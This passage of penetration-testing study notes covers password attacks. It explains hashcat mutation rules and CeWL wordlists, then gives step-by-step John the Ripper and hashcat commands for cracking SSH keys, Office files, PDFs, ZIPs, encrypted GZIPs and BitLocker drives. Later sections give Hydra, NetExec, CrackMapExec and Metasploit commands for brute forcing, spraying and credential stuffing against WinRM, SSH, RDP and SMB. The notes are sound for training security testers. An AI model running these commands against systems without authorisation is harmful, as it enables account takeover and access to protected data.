| Rotate Right         | }            | Rotate the word right                                   | }                | p@ssW0rd       | dp@ssW0r               |
| Append Character     | $X           | Append character X to end                               | $1$2             | p@ssW0rd       | p@ssW0rd12             |
| Prepend Character    | ^X           | Prepend character X to front                            | ^2^1             | p@ssW0rd       | 12p@ssW0rd             |
| Truncate left        | [            | Delete first character                                  | [                | p@ssW0rd       | @ssW0rd               |
| Truncate right       | ]            | Delete last character                                   | ]                | p@ssW0rd       | p@ssW0r               |
| Delete @ N           | DN           | Delete character at position N                          | D3               | p@ssW0rd       | p@sW0rd               |
| Extract range        | xNM          | Extract M characters from position N                    | x04              | p@ssW0rd       | p@ss                  |
| Omit range           | ONM          | Delete M characters from position N                     | O12              | p@ssW0rd       | psW0rd                |
| Insert @ N           | iNX          | Insert character X at position N                        | i4!              | p@ssW0rd       | p@ss!W0rd             |
| Overwrite @ N        | oNX          | Overwrite character at position N with X                | o3$              | p@ssW0rd       | p@s$W0rd              |
| Truncate @ N         | 'N           | Truncate word at position N                             | '6               | p@ssW0rd       | p@ssW0                |
| Replace              | sXY          | Replace all instances of X with Y                       | ss$              | p@ssW0rd       | p@$$W0rd              |
| Purge                | @X           | Purge all instances of X                                | @s               | p@ssW0rd       | p@W0rd                |
| Duplicate first N    | zN           | Duplicate first character N times                       | z2               | p@ssW0rd       | ppp@ssW0rd            |
| Duplicate last N     | ZN           | Duplicate last character N times                        | Z2               | p@ssW0rd       | p@ssW0rddd            |
| Duplicate all        | q            | Duplicate every character                               | q                | p@ssW0rd       | pp@@ssssWW00rrdd      |
| Extract memory       | XNMI         | Insert substring of length M from position N of memory  | lMX428           | p@ssW0rd       | p@ssw0rdw0            |
| Append memory        | 4            | Append word saved to memory                             | uMl4             | p@ssW0rd       | p@ssw0rdP@SSW0RD      |
| Prepend memory       | 6            | Prepend word saved to memory                            | rMr6             | p@ssW0rd       | dr0Wss@pp@ssW0rd      |
| Memorize             | M            | Memorize current word                                   | lMuX084          | p@ssW0rd       | P@SSp@ssw0rdW0RD      |

Each rule is written on a new line and determines how a given word should be transformed.

```bash
cat custom.rule

# :
# c
# so0
# c so0
# sa@
# c sa@
# c sa@ so0
# $!
# $! c
# $! so0
# $! sa@
# $! c so0
# $! c sa@
# $! so0 sa@
# $! c so0 sa@
```

We can use the following command to apply the rules in custom.rule to each word in password.list and store the mutated results in mut_password.list.

```bash
hashcat --force password_list.txt -r custom.rule --stdout | sort -u > custom_password_list.txt
```

In this case, each word will produce fifteen mutated variants.

```bash
cat custom_password_list.txt

# password
# Password
# passw0rd
# Passw0rd
# p@ssword
# P@ssword
# P@ssw0rd
# password!
# Password!
# passw0rd!
# p@ssword!
# Passw0rd!
# P@ssword!
# p@ssw0rd!
# P@ssw0rd!
```

</details>

<details>
<summary><h3>Generating wordlists using CeWL</h3></summary>

We can use a tool called CeWL to scan potential words from a company's website and save them in a list. We can then combine this list with the desired rules to create a customized password list—one that has a higher probability of containing the correct password for an employee.

| **Option(s)**                     | **Argument**     | **Description**                                                  | **Default** |
|----------------------------------|------------------|------------------------------------------------------------------|-------------|
| `-h`, `--help`                   | —                | Show help.                                                       | —           |
| `-k`, `--keep`                   | —                | Keep the downloaded file.                                        | —           |
| `-d`, `--depth`                  | `<x>`            | Depth to spider to.                                              | 2           |
| `-m`, `--min_word_length`        | —                | Minimum word length.                                             | 3           |
| `-o`, `--offsite`                | —                | Let the spider visit other sites.                                | —           |
| `-w`, `--write`                  | —                | Write the output to the file.                                    | —           |
| `-u`, `--ua`                     | `<agent>`        | User agent to send.                                              | —           |
| `-n`, `--no-words`               | —                | Don't output the wordlist.                                       | —           |
| `-a`, `--meta`                   | —                | Include meta data.                                               | —           |
| `--meta_file`                    | `<file>`         | Output file for meta data.                                       | —           |
| `-e`, `--email`                  | —                | Include email addresses.                                         | —           |
| `--email_file`                   | `<file>`         | Output file for email addresses.                                 | —           |
| `--meta-temp-dir`                | `<dir>`          | Temporary dir used by exiftool when parsing files.               | `/tmp`      |
| `-c`, `--count`                  | —                | Show the count for each word found.                              | —           |
| `-v`, `--verbose`                | —                | Verbose output.                                                  | —           |
| `--debug`                        | —                | Extra debug information.                                         | —           |

**Example**

```bash
cewl https://www.domain.com -d 4 -m 6 --lowercase -w domain_wordlist.txt
```

</details>

</details>

<details>
<summary><h2>Cracking Protected Files</h2></summary>

Attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.

JtR has many different scripts for extracting hashes from files. We can find these scripts on our system using the following command:

```bash
locate *2john*
```

Besides standalone files, we will often run across archives and compressed files—such as ZIP files—which are protected with a password.

There are many types of [compressed files](https://fileinfo.com/filetypes/compressed). Some of the more commonly encountered file extensions include `tar`, `gz`, `rar`, `zip`, `vmdb/vmx`, `cpt`, `truecrypt`, `bitlocker`, `kdbx`, `deb`, `7z`, and `gzip`.

It is possible to extract all the extensions in a list using the following command:

```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

While many archive formats natively support password protection (e.g., ZIP, RAR), others like TAR require external encryption tools. Common solutions include `openssl` or `gpg`.

<details>
<summary><h3>Cracking encrypted SSH keys</h3></summary>

1. John the Ripper (JtR) includes a Python script called **ssh2john.py** to acquire the corresponding hash for an encrypted SSH key

```bash
ssh2john.py SSH.private > ssh.hash
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

3. We can then view the resulting hash

```bash
john ssh.hash --show
```

</details>

<details>
<summary><h3>Cracking password-protected Office documents</h3></summary>

1. John the Ripper (JtR) includes a Python script called **office2john.py**, which can be used to extract password hashes from all common Office (Word, Excel, PowerPoint...) document formats.

```bash
office2john.py supersecret.docx > supersecret_hash.txt
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt supersecret_hash.txt
```

3. We can then view the resulting hash

```bash
john supersecret_hash.txt --show
```

</details>

<details>
<summary><h3>Cracking password-protected PDFs</h3></summary>

1. John the Ripper (JtR) includes a Python script called **pdf2john.py**, which can be used to extract password hashes from encrypted PDF documents for offline password cracking.

```bash
pdf2john.py important_report.pdf > important_report_hash.txt
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt important_report_hash.txt
```

3. We can then view the resulting hash

```bash
john important_report_hash.txt --show
```

</details>

<details>
<summary><h3>Cracking ZIP files</h3></summary>

1. John the Ripper (JtR) includes a utility called zip2john, which extracts password hashes from encrypted ZIP archives and formats them for cracking.

```bash
zip2john files.zip > files_hash.txt
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt files_hash.txt
```

3. We can then view the resulting hash

```bash
john files_hash.txt --show
```

</details>

<details>
<summary><h3>Cracking OpenSSL encrypted GZIP files</h3></summary>

1. To determine if a GZIP file is encrypted, we can use the following command:

```bash
file compressed_files.gzip 

# compressed_files.gzip.gzip: openssl enc'd data with salted password
```

2. To systematically attempt decryption of the file using a wordlist, execute the following one-liner:

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt);do openssl enc -aes-256-cbc -d -in <FILE> -k $i 2>/dev/null| tar xz;done
```

3. You may encounter multiple GZIP decompression warnings or errors:

```bash
# ...

# gzip: stdin: not in gzip format
# tar: Child returned status 1
# tar: Error is not recoverable: exiting now

# ...
```

Once the for loop has finished, we can check the current directory for a newly extracted file.

</details>

<details>
<summary><h3>Cracking BitLocker-encrypted drives</h3></summary>

[BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/#device-encryption) is a full-disk encryption feature developed by Microsoft for the Windows operating system.

John the Ripper (JtR) includes a utility called **bitlocker2john**, which extracts [four distinct hash types](https://openwall.info/wiki/john/OpenCL-BitLocker) from BitLocker-encrypted drives: two password-based hashes for user authentication and two recovery key hashes for backup access. We will focus on cracking the password using the first hash.

1. Extract the hashes

```bash
bitlocker2john -i backup.vhd > backup_hashes.txt
```

2. Filter the line that contains the BitLocker hash

```bash
grep "bitlocker\$0" backup_hashes.txt > backup_hash.txt
```

3. Then use JtR or Hahcat to try and crack it

**Hashcat**

```bash
hashcat -a 0 -m 22100 '<BITLOCKER_HASH>' /usr/share/wordlists/rockyou.txt
```

**John**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash.txt
```

<details>
<summary><h4>Mounting BitLocker-encrypted drives in Windows</h4></summary>

The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the .vhd file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.

</details>

<details>
<summary><h4>Mounting BitLocker-encrypted drives in Linux (or macOS)</h4></summary>

To do this, we can use a tool called [dislocker](https://github.com/Aorimn/dislocker).

1. Install the tool

```bash
sudo apt-get install dislocker
```

2. Create two folders which we will use to mount the VHD

```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

3. Use losetup to configure the VHD as loop device

```bash
sudo losetup -f -P backup.vhd
```

4. List the devices

```bash
sudo losetup -l
```

5. List the partitions of the device

```bash
sudo fdisk -l /dev/loop0
```

6. Decrypt the drive using dislocker

```bash
sudo dislocker /dev/loop0p1 -u<PASSWORD> -- /media/bitlocker
```

7. Mount the decrypted volume

```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

8. If everything was done correctly, we can now browse the files:

```bash
cd /media/bitlockermount/
ls -la
```

</details>

</details>

</details>

</details>

---

<details>
<summary><h1>Remote Password Attacks</h1></summary>

During security assessments, we consistently encounter numerous network services configured with specific permissions and user assignments. These services facilitate content management, data exchange, and system administration across enterprise environments.

**Recommended Resource**

For comprehensive service enumeration techniques, refer to the [FOOTPRINTING](./01-footprinting.md) module.

<details>
<summary><h2>NetExec: A Versatile Tool</h2></summary>

NetExec serves as a powerful, modular framework for conducting password attacks and protocol-specific exploitation across network environments.

**Installing NetExec**

```bash
sudo apt-get -y install netexec
```

**NetExec Menu Options**

```bash
netexec -h
```

**NetExec Available Protocols**

* MSSQL
* WinRM
* LDAP
* SMB
* SSH
* VNC
* WMI
* FTP
* RDP

**NetExec Protocol-Specific Help**

```bash
netexec <PROTOCOL> -h
```

**NetExec Usage**

```bash
netexec <PROTOCOL> <TARGET_IP> -u <USER> -p <PASSWORD>
```

> The username and password fields can be just a string or a wordlist file.

</details>

<details>
<summary><h2>Network Services</h2></summary>

<details>
<summary><h3>WinRM</h3></summary>

[WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) is Microsoft's implementation of the [WS-Management protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol), providing a standardized framework for remote Windows system administration.

<!-- 
**1. Functional Capabilities**

* Remote command execution

* System configuration management

* Real-time performance monitoring

**2. Authentication Methods**

* Basic

* NTLM

* Kerberos

* Certificate-based

**3. Security Considerations**

* Often misconfigured with excessive privileges

* Common target for lateral movement attacks

* Requires proper certificate management for HTTPS implementations

A handy tool that we can use to communicate with the WinRM service is Evil-WinRM, which allows us to communicate with the WinRM service efficiently.
 -->

**CrackMapExec**

Brute Force Login

```bash
crackmapexec winrm <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST> -q
```

**Evil-WinRM**

Install

```bash
sudo gem install evil-winrm
```

Usage

```bash
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>
```

Expected output

```bash
# Evil-WinRM shell v3.3

# Info: Establishing connection to remote endpoint

# *Evil-WinRM* PS C:\Users\user\Documents>
```

> **NOTE:** If the login was successful, a terminal session is initialized using the Powershell Remoting Protocol (MS-PSRP), which simplifies the operation and execution of commands.

</details>

<details>
<summary><h3>SSH</h3></summary>

<!-- Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The protocol implements three cryptographic primitives:

1. Symmetric Encryption

    * Uses shared secret keys (AES-256, ChaCha20, etc.) for session encryption

    * Implements Ephemeral Diffie-Hellman for secure key exchange

    * Key characteristics:

        * 128-512 bit keys (configurable)

        * Encrypts all subsequent communications

        * Common ciphers: AES-GCM, Blowfish, 3DES (deprecated)

2. Asymmetric Encryption

    * Leverages key pairs (RSA/ECDSA/Ed25519) for:

        * Host authentication

        * Key exchange initialization

    * Critical security considerations

        * Private keys should always be passphrase-protected

        * Default key locations (`~/.ssh/id_rsa`) are common attack targets

3. Hashing (HMAC)

    * Verifies message integrity via SHA-2/SHA-3 algorithms

    * Prevents replay attacks and tampering -->

We can use a tool like **Hydra** to brute force SSH. This is covered in-depth in the [LOGIN BRUTE FORCING](./13-login-brute-forcing.md) module.

**Hydra - SSH**

Brute force SSH

```bash
hydra -L <USER_LIST> -P <PASSWORD_LIST> ssh://<TARGET_IP>
```

Log in to the system via SSH

```bash
ssh <USER>@<TARGET_IP>
```

> The username and password fields can be just a string or a wordlist file.

</details>

<details>
<summary><h3>Remote Desktop Protocol (RDP)</h3></summary>

[Microsoft's Remote Desktop Protocol](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.

**Hydra - RDP**

```bash
hydra -L <USER_LIST> -P <PASSWORD_LIST> rdp://<TARGET_IP>
```

> The username and password fields can be just a string or a wordlist file.

Log in to the system via xFreeRDP

```bash
xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD>
```

</details>

<details>
<summary><h3>SMB</h3></summary>

[Server Message Block](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (SMB) is a protocol responsible for transferring data between a client and a server in local area networks.

1. Brute Force Credentials

**Hydra - SMB**

```bash
hydra -L <USER_LIST> -P <PASSWORD_LIST> -V <TARGET_IP> smb
```

> The username and password fields can be just a string or a wordlist file.

**OPTION 1: CrackMapExec - SMB**

```bash
crackmapexec smb <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST>
```

> The username and password fields can be just a string or a wordlist file.

**OPTION 2: Metaploit - SMB**

```bash
sudo msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 > options
msf6 > set USER_FILE <USER_LIST>
msf6 > set PASS_FILE <PASSWORD_LIST>
msf6 > set RHOSTS <TARGET_IP>
msf6 > set STOP_ON_SUCCESS true
msf6 > set CreateSession true

msf6 > run
```

If valid credentials credentials were found, a session is created

```bash
msf6 > sessions

msf6 > sessions -i <SESSION_ID>

SMB (<TARGET_IP>) > shares

SMB (<TARGET_IP>) > shares -i <SHARE_ID>
```


2. List Shares

We can use NetExec to view the available shares and what privileges we have for them.

```bash
netexec smb <TARGET_IP> -u "<USER>" -p "<PASSWORD>" --shares
```

3. Log in to the system via Smbclient

```bash
smbclient -U <USER> \\\\<TARGET_IP>\\<SHARENAME>
```

</details>

</details>

<details>
<summary><h2>Spraying, Stuffing, and Defaults</h2></summary>

<details>
<summary><h3>Password spraying</h3></summary>

Password spraying is a credential-based attack where a single password is tested against multiple user accounts before moving to the next password. 

This technique:

* Avoids account lockouts by spacing attempts

* Exploits weak organizational password policies

* Targets default/initial passwords (e.g., CompanyName123, Welcome1)

High-risk scenarios:

* Default credentials in onboarding processes  

* Password reuse across departments  

* Lack of multi-factor authentication (MFA)

| Target Environment       | Recommended Tools                          | Protocol/Port Focus        |
|--------------------------|--------------------------------------------|---------------------------|
| Web Applications         | Burp Suite Intruder, OWASP ZAP             | HTTP/HTTPS (80, 443)      |
| Active Directory         | NetExec, Kerbrute                          | LDAP/SMB (389, 445)       |
| Cloud Services           | MSOLSpray, Okta API scripts                | REST APIs (443)           |
| Legacy Systems           | Hydra, Metasploit auxiliary modules        | SSH/RDP (22, 3389)        |

**Example**

```bash
netexec smb 10.100.38.0/24 -u <USERNAMES> -p 'Corp1234'
```

</details>

<details>
<summary><h3>Credential stuffing</h3></summary>

Credential stuffing leverages compromised credentials from one service to gain unauthorized access to unrelated systems, exploiting widespread password reuse across platforms (email, SaaS, enterprise systems).

```bash
hydra -C user_pass_list.txt ssh://<TARGET_IP> -t 4 -W 5
```

</details>

<details>
<summary><h3>Default credentials</h3></summary>

Network infrastructure devices and enterprise software frequently ship with factory-set credentials, creating critical exposure when left unmodified during deployment.

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).

Install

```bash
pip3 install defaultcreds-cheat-sheet
```

Once installed, we can use the creds command to search for known default credentials associated with a specific product or vendor.

```bash
creds search <KEYWORD>
```

Example:

```bash
creds search linksys --export

# +---------------+---------------+------------+
# | Product       |    username   |  password  |
# +---------------+---------------+------------+
# | linksys       |    <blank>    |  <blank>   |
# | linksys       |    <blank>    |   admin    |
# | linksys       |    <blank>    | epicrouter |
# | linksys       | Administrator |   admin    |
# | linksys       |     admin     |  <blank>   |
# | linksys       |     admin     |   admin    |
# | linksys       |    comcast    |    1234    |
# | linksys       |      root     |  orion99   |
# | linksys       |      user     |  tivonpw   |
# | linksys (ssh) |     admin     |   admin    |
# | linksys (ssh) |     admin     |  password  |
# | linksys (ssh) |    linksys    |  <blank>   |
# | linksys (ssh) |      root     |   admin    |
# +---------------+---------------+------------+

# [+] Creds saved to /tmp/linksys-usernames.txt , /tmp/linksys-passwords.txt 📥
```


</details>

</details>

</details>

</details>

---

<details>
<summary><h1>Extracting Passwords from Windows Systems</h1></summary>

</details>

---

📘 **Next step:** Continue with [COMMON SERVICES](./08-common-services.md)